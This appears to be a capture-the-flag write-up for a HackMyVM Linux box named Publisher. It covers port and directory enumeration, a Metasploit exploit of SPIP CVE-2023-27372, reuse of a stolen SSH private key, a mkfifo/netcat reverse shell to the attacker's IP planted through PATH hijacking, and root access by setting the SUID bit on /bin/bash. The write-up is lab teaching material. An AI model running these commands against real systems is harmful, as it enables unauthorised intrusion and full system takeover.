@@ -1,1 +1,545 @@
-salako
+                    ENUMERATION
+			
+
+---nmap---
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# nmap 10.0.2.78 -sS -sC -sV -A -T4 -p-   
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-25 17:51 +03
+Nmap scan report for publisher.local (10.0.2.78)
+Host is up (0.00074s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
+|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
+|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Publisher's Pulse: SPIP Insights & Tips
+MAC Address: 08:00:27:AE:7A:73 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.74 ms publisher.local (10.0.2.78)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 35.47 seconds
+                                            
+
+
+--- gobuster ---
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# gobuster dir -u http://10.0.2.78 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,txt,php,jpg
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.0.2.78
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              html,txt,php,jpg
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.html                (Status: 403) [Size: 274]
+/images               (Status: 301) [Size: 307] [--> http://10.0.2.78/images/]
+/.php                 (Status: 403) [Size: 274]
+/index.html           (Status: 200) [Size: 8686]
+/spip                 (Status: 301) [Size: 305] [--> http://10.0.2.78/spip/]
+/.html                (Status: 403) [Size: 274]
+/.php                 (Status: 403) [Size: 274]
+/server-status        (Status: 403) [Size: 274]
+Progress: 1102800 / 1102805 (100.00%)
+===============================================================
+Finished
+===============================================================
+
+
+
+
+--- By checking the website we discover that this website uses SPIP --- 
+
+
+SPIP: A free software content management system designed for web site publishing
+
+
+
+
+--- I search for a vulnerability and find the CVE-2023-27372 in exploit-db.com ---
+
+
+
+--- Then I search for it in msf ---
+
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# msfconsole  
+Metasploit tip: Use the 'capture' plugin to start multiple 
+authentication-capturing and poisoning services
+                                                  
+
+msf6 > search CVE-2023-27372
+
+Matching Modules
+================
+
+   #  Name                                     Disclosure Date  Rank       Check  Description
+   -  ----                                     ---------------  ----       -----  -----------
+   0  exploit/unix/webapp/spip_rce_form        2023-02-27       excellent  Yes    SPIP form PHP Injection
+   1    \_ target: Automatic (PHP In-Memory)   .                .          .      .
+   2    \_ target: Automatic (Unix In-Memory)  .                .          .      .
+
+
+Interact with a module by name or index. For example info 2, use 2 or use exploit/unix/webapp/spip_rce_form
+After interacting with a module you can manually set a TARGET with set TARGET 'Automatic (Unix In-Memory)'
+
+msf6 > use 1
+[*] Additionally setting TARGET => Automatic (PHP In-Memory)
+[*] Using configured payload php/meterpreter/reverse_tcp
+
+
+msf6 exploit(unix/webapp/spip_rce_form) > show options
+
+Module options (exploit/unix/webapp/spip_rce_form):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploi
+                                         t/basics/using-metasploit.html
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
+   TARGETURI  /                yes       The base path to SPIP application
+   URIPATH                     no        The URI to use for this exploit (default is random)
+   VHOST                       no        HTTP server virtual host
+
+
+   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address
+                                       on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT  8080             yes       The local port to listen on.
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic (PHP In-Memory)
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(unix/webapp/spip_rce_form) > set RHOSTS 10.0.2.78
+RHOSTS => 10.0.2.78
+msf6 exploit(unix/webapp/spip_rce_form) > set LHOST 10.0.2.54
+LHOST => 10.0.2.54
+msf6 exploit(unix/webapp/spip_rce_form) > set TARGETURI /spip
+TARGETURI => /spip
+
+msf6 exploit(unix/webapp/spip_rce_form) > run
+
+[*] Started reverse TCP handler on 10.0.2.54:4444 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[*] SPIP Version detected: 4.2.0
+[+] The target appears to be vulnerable.
+[*] Got anti-csrf token: AKXEs4U6r36PZ5LnRZXtHvxQ/ZZYCXnJB2crlmVwgtlVVXwXn/MCLPMydXPZCL/WsMlnvbq2xARLr6toNbdfE/YV7egygXhx
+[*] 10.0.2.78:80 - Attempting to exploit...
+[*] Sending stage (39927 bytes) to 10.0.2.78
+[*] Meterpreter session 1 opened (10.0.2.54:4444 -> 10.0.2.78:43304) at 2024-06-25 20:29:47 +0300
+
+meterpreter > shell
+Process 175 created.
+Channel 0 created.
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+whoami
+www-data
+
+
+
+
+			            GAINING FOOTHOLD
+
+
+
+
+--- great, we have a shell now and we are in as www-data, now let's look around ---
+
+
+cd /home
+
+ls
+think
+
+ls -la
+total 12
+drwxr-xr-x 1 root  root  4096 Dec  7  2023 .
+drwxr-xr-x 1 root  root  4096 Dec 20  2023 ..
+drwxr-xr-x 8 think think 4096 Feb 10 21:27 think
+
+cd think
+
+ls -la
+total 48
+drwxr-xr-x 8 think    think    4096 Feb 10 21:27 .
+drwxr-xr-x 1 root     root     4096 Dec  7  2023 ..
+lrwxrwxrwx 1 root     root        9 Jun 21  2023 .bash_history -> /dev/null
+-rw-r--r-- 1 think    think     220 Nov 14  2023 .bash_logout
+-rw-r--r-- 1 think    think    3771 Nov 14  2023 .bashrc
+drwx------ 2 think    think    4096 Nov 14  2023 .cache
+drwx------ 3 think    think    4096 Dec  8  2023 .config
+drwx------ 3 think    think    4096 Feb 10 21:22 .gnupg
+drwxrwxr-x 3 think    think    4096 Jan 10 12:46 .local
+-rw-r--r-- 1 think    think     807 Nov 14  2023 .profile
+lrwxrwxrwx 1 think    think       9 Feb 10 21:27 .python_history -> /dev/null
+drwxr-xr-x 2 think    think    4096 Jan 10 12:54 .ssh
+lrwxrwxrwx 1 think    think       9 Feb 10 21:27 .viminfo -> /dev/null
+drwxr-x--- 5 www-data www-data 4096 Dec 20  2023 spip
+-rw-r--r-- 1 root     root       35 Feb 10 21:20 user.txt
+
+cat user.txt
+fa229046d44eda6a3598c73ad96f4ca5 
+
+---First User Flag---
+
+
+
+
+--- in the think folder we see a .ssh folder , by checking the contents of it we discover private and public ssh keys ---
+
+
+cd .ssh
+
+ls
+authorized_keys
+id_rsa
+id_rsa.pub
+
+
+
+--- I assume the username will be think, now I will copy and use this private ssh key to try to gain access into the
+ssh server ---
+
+
+
+
+                                                                                                        
+┌──(root㉿kali)-[/home/…/Desktop/NOTLAR/HACKMYVM/46- PUBLISHER LINUX CTF]
+└─# nano id_rsa  
+
+--- copy the id_rsa and paste into a file I create ---
+
+
+
+
+--- now login ---
+
+
+┌──(root㉿kali)-[/home/…/Desktop/NOTLAR/HACKMYVM/46- PUBLISHER LINUX CTF]
+└─# ssh think@10.0.2.78 -i id_rsa 
+The authenticity of host '10.0.2.78 (10.0.2.78)' can't be established.
+ED25519 key fingerprint is SHA256:Ndgax/DOZA6JS00F3afY6VbwjVhV2fg5OAMP9TqPAOs.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.0.2.78' (ED25519) to the list of known hosts.
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+Permissions 0644 for 'id_rsa' are too open.
+It is required that your private key files are NOT accessible by others.
+This private key will be ignored.
+Load key "id_rsa": bad permissions
+think@10.0.2.78's password: 
+
+
+
+--- we got permission related error, I change the permissions of the file ---
+
+
+
+┌──(root㉿kali)-[/home/…/Desktop/NOTLAR/HACKMYVM/46- PUBLISHER LINUX CTF]
+└─# chmod 600 id_rsa          
+                              
+
+
+                                                                          
+┌──(root㉿kali)-[/home/…/Desktop/NOTLAR/HACKMYVM/46- PUBLISHER LINUX CTF]
+└─# ssh think@10.0.2.78 -i id_rsa
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-169-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+think@publisher:~$ pwd
+/home/think
+
+think@publisher:~$ ls
+spip  user.txt
+
+think@publisher:~$ cat user.txt   
+---First User Flag---
+
+
+--- and just like that, we are in the ssh server, now let's search for ways to priv escalate ---
+
+
+
+
+
+
+			
+		        	PRIVILEGE ESCALATION
+
+
+
+think@publisher:/tmp$ find / -user root -perm -u=s 2>/dev/null
+
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/xorg/Xorg.wrap
+/usr/sbin/pppd
+/usr/sbin/run_container
+/usr/bin/fusermount
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/sudo
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/mount
+/usr/bin/su
+/usr/bin/newgrp
+/usr/bin/pkexec
+/usr/bin/umount
+
+
+
+
+--- let's check /usr/sbin/run_container ---
+
+
+--- running cat gives us encrypted data, I utilize strings ---
+
+
+
+
+think@publisher:~$ strings /usr/sbin/run_container 
+/lib64/ld-linux-x86-64.so.2
+libc.so.6
+__stack_chk_fail
+execve
+__cxa_finalize
+__libc_start_main
+GLIBC_2.2.5
+GLIBC_2.4
+_ITM_deregisterTMCloneTable
+_gmon_start_
+_ITM_registerTMCloneTable
+u+UH
+[]A\A]A^A_
+/bin/bash
+/opt/run_container.sh
+:*3$"
+GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0
+crtstuff.c
+deregister_tm_clones
+__do_global_dtors_aux
+completed.8061
+.
+.
+.
+
+
+
+--- We notice the executable file /opt/run_container.sh but we can't gain access into the file ---
+
+
+
+think@publisher:~$ ls -la /opt/run_container.sh
+-rwxrwxrwx 1 root root 1715 Mar 29 13:25 /opt/run_container.sh
+
+
+
+think@publisher:~$ cat /opt/run_container.sh
+cat: /opt/run_container.sh: Permission denied
+
+
+
+
+--- we can simply execute the file though, by doing so we get an error and then we are asked to create a new
+container ---
+
+
+
+think@publisher:~$ /opt/run_container.sh
+permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get "http://%2Fvar%2Frun%2Fdocker.sock/v1.24/containers/json?all=1": dial unix /var/run/docker.sock: connect: permission denied
+docker: permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Post "http://%2Fvar%2Frun%2Fdocker.sock/v1.24/containers/create": dial unix /var/run/docker.sock: connect: permission denied.
+See 'docker run --help'.
+List of Docker containers:
+permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get "http://%2Fvar%2Frun%2Fdocker.sock/v1.24/containers/json?all=1": dial unix /var/run/docker.sock: connect: permission denied
+
+Enter the ID of the container or leave blank to create a new one: 5
+/opt/run_container.sh: line 16: validate_container_id: command not found
+
+OPTIONS:
+1) Start Container    3) Restart Container  5) Quit
+2) Stop Container     4) Create Container
+Choose an action for a container: 5
+Exiting...
+
+
+
+--- we notice that there is not a validate_container_id file. We can create a file with that name and place a 
+reverse shell in it, we can get a connection that way ---
+
+
+
+
+--- I will utilize an mkfifo rev shell so that these pipes can be used by unrelated processes ---
+
+
+Not: In Linux, mkfifo is a command used to create named pipes (also known as FIFOs, which stands for First In First Out). 
+A named pipe is a special type of file that allows for communication between processes. Unlike regular pipes, 
+named pipes have a name within the file system and can be used by unrelated processes to communicate with each other.
+
+
+
+--- for reference check revshells.com --- 
+
+
+think@publisher:~$ cd /tmp
+
+think@publisher:/tmp$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.0.2.54 4040 >/tmp/f' > validate_container_id
+
+think@publisher:/tmp$ chmod +x validate_container_id 
+
+
+
+
+think@publisher:/tmp$ export PATH=/tmp:$PATH
+
+
+--- After running this command, the executable file we have in the /tmp directory will be found and executed 
+before any similarly named executable in other directories listed in PATH environment ---
+
+
+
+--- to make sure of our executable file's presence ---
+
+think@publisher:/tmp$ which validate_container_id
+/tmp/validate_container_id
+
+
+
+
+--- now we will open up a listener and then run the /opt/run_container.sh to gain a shell ---
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# nc -lp 4040
+id
+
+
+
+
+
+
+--- I check the current path of our shell ---
+
+think@publisher:~$ echo $SHELL
+/usr/sbin/ash
+
+
+
+think@publisher:/tmp$ /opt/run_container.sh
+.
+.
+.
+
+Enter the ID of the container or leave blank to create a new one: 1
+
+
+
+
+┌──(root㉿kali)-[/home/…/Desktop/NOTLAR/HACKMYVM/46- PUBLISHER LINUX CTF]
+└─# nc -lp 4040
+id
+think@publisher:/tmp$ id
+uid=1000(think) gid=1000(think) groups=1000(think)
+think@publisher:/tmp$ ls /opt
+ls /opt
+containerd
+dockerfile
+run_container.sh
+think@publisher:/tmp$ 
+
+
+
+--- and just like this we have a new shell with less restrictions, now we are able to see the contents of 
+the /opt folder ---
+
+
+
+--- now let's put a SUID bit into the run_container file ---
+
+
+think@publisher:/opt$ echo 'chmod +s /bin/bash' > run_container.sh
+echo 'chmod +s /bin/bash' > run_container.sh
+
+
+
+think@publisher:/opt$ cat run_container.sh
+chmod +s /bin/bash
+
+
+think@publisher:/opt$ ls -l /bin/bash 
+ls -l /bin/bash
+-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash
+think@publisher:/opt$ bash -p
+bash -p
+
+id
+uid=1000(think) gid=1000(think) euid=0(root) egid=0(root) groups=0(root),1000(think)
+
+whoami
+root
+
+cd /root
+
+ls
+root.txt
+spip
+
+cat root.txt
+---Root User Flag---
